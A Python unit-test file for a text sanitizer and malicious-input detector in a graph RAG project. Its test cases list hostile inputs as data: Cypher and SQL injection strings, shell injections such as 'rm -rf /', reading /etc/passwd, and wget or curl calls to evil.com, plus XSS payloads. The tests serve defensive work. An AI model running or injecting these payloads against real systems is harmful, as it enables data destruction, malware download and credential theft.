import unittest
import sys
import os

# Add the parent directory to the path so we can import graph_rag modules
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from graph_rag.sanitizer import sanitize_text, is_probably_malicious

class TestSanitizer(unittest.TestCase):

    def test_sanitize_text_normal_input(self):
        """Test sanitization of normal, benign text."""
        normal_text = "Hello, world! This is a normal question about companies."
        result = sanitize_text(normal_text)
        self.assertEqual(result, "Hello, world! This is a normal question about companies.")

    def test_sanitize_text_removes_suspicious_sequences(self):
        """Test that suspicious sequences are removed."""
        malicious_text = "Hello; DROP TABLE users; MATCH (n) CREATE (m)"
        result = sanitize_text(malicious_text)
        # Semicolons, DROP TABLE, MATCH, and CREATE should be replaced with spaces
        # Multiple spaces should be normalized to single spaces
        expected = "Hello users (n) (m)"
        self.assertEqual(result, expected)

    def test_sanitize_text_removes_control_characters(self):
        """Test that control characters are removed."""
        text_with_controls = "Hello\x00\x01\x02World\x7F"
        result = sanitize_text(text_with_controls)
        self.assertEqual(result, "HelloWorld")

    def test_sanitize_text_normalizes_whitespace(self):
        """Test that multiple whitespace characters are normalized."""
        text_with_whitespace = "Hello    \t\n\r   World   \n\n  !"
        result = sanitize_text(text_with_whitespace)
        self.assertEqual(result, "Hello World !")

    def test_sanitize_text_limits_length(self):
        """Test that text is truncated to maximum length."""
        long_text = "A" * 5000  # Longer than MAX_TEXT_LENGTH (4096)
        result = sanitize_text(long_text)
        self.assertEqual(len(result), 4096)
        self.assertTrue(result.startswith("AAAA"))

    def test_sanitize_text_handles_non_string_input(self):
        """Test that non-string input returns empty string."""
        self.assertEqual(sanitize_text(None), "")
        self.assertEqual(sanitize_text(123), "")
        self.assertEqual(sanitize_text([]), "")

    def test_sanitize_text_removes_script_tags(self):
        """Test that script tags are removed."""
        malicious_html = "Hello <script>alert('xss')</script> World"
        result = sanitize_text(malicious_html)
        self.assertEqual(result, "Hello >alert('xss') World")

    def test_is_probably_malicious_normal_text(self):
        """Test that normal text is not flagged as malicious."""
        normal_texts = [
            "What companies were founded in 2020?",
            "Tell me about Microsoft's products.",
            "Who is the CEO of Apple?",
            "Show me recent investments in AI.",
        ]
        for text in normal_texts:
            self.assertFalse(is_probably_malicious(text), f"Text should not be malicious: {text}")

    def test_is_probably_malicious_cypher_injection(self):
        """Test detection of Cypher injection attempts."""
        malicious_cypher = [
            "MATCH (n) DELETE n RETURN count(*) CREATE (m)",
            "What about MATCH (u:User) WHERE u.id = 1 DELETE u MERGE (admin:User {name:'hacker'})",
            "CALL apoc.load.json('http://evil.com') YIELD value CREATE (n:Malicious)",
        ]
        for text in malicious_cypher:
            self.assertTrue(is_probably_malicious(text), f"Text should be malicious: {text}")

    def test_is_probably_malicious_sql_injection(self):
        """Test detection of SQL injection patterns."""
        malicious_sql = [
            "admin' OR '1'='1",
            "'; DROP TABLE users; --",
            "UNION SELECT password FROM users",
            "1' AND 1=1 --",
        ]
        for text in malicious_sql:
            self.assertTrue(is_probably_malicious(text), f"Text should be malicious: {text}")

    def test_is_probably_malicious_shell_commands(self):
        """Test detection of shell command injection."""
        malicious_shell = [
            "What about companies; rm -rf /",
            "Tell me about `cat /etc/passwd`",
            "Show me results && wget http://evil.com/malware",
            "Companies founded by $(curl evil.com)",
        ]
        for text in malicious_shell:
            self.assertTrue(is_probably_malicious(text), f"Text should be malicious: {text}")

    def test_is_probably_malicious_excessive_special_chars(self):
        """Test detection of excessive special characters."""
        malicious_obfuscated = ";;;'''\"\"\"((())){}{}{}[][]<><><>|||&&&$$$```"
        self.assertTrue(is_probably_malicious(malicious_obfuscated))

    def test_is_probably_malicious_javascript_patterns(self):
        """Test detection of JavaScript injection patterns."""
        malicious_js = [
            "javascript:alert('xss')",
            "eval('malicious code')",
            "setTimeout(function(){hack()}, 1000)",
        ]
        for text in malicious_js:
            self.assertTrue(is_probably_malicious(text), f"Text should be malicious: {text}")

    def test_is_probably_malicious_handles_non_string(self):
        """Test that non-string input is not flagged as malicious."""
        self.assertFalse(is_probably_malicious(None))
        self.assertFalse(is_probably_malicious(123))
        self.assertFalse(is_probably_malicious([]))

    def test_integration_sanitize_and_detect(self):
        """Test integration of sanitization and malicious detection."""
        # Start with malicious text
        original = "Hello; MATCH (n) DELETE n; DROP TABLE users; CREATE (m)"
        
        # Should be detected as malicious before sanitization
        self.assertTrue(is_probably_malicious(original))
        
        # After sanitization, suspicious sequences are removed
        sanitized = sanitize_text(original)
        expected = "Hello (n) n users (m)"
        self.assertEqual(sanitized, expected)
        
        # Sanitized version should be less likely to be flagged (though may still be)
        # This is expected behavior - sanitization reduces but doesn't eliminate all risk

if __name__ == '__main__':
    unittest.main()
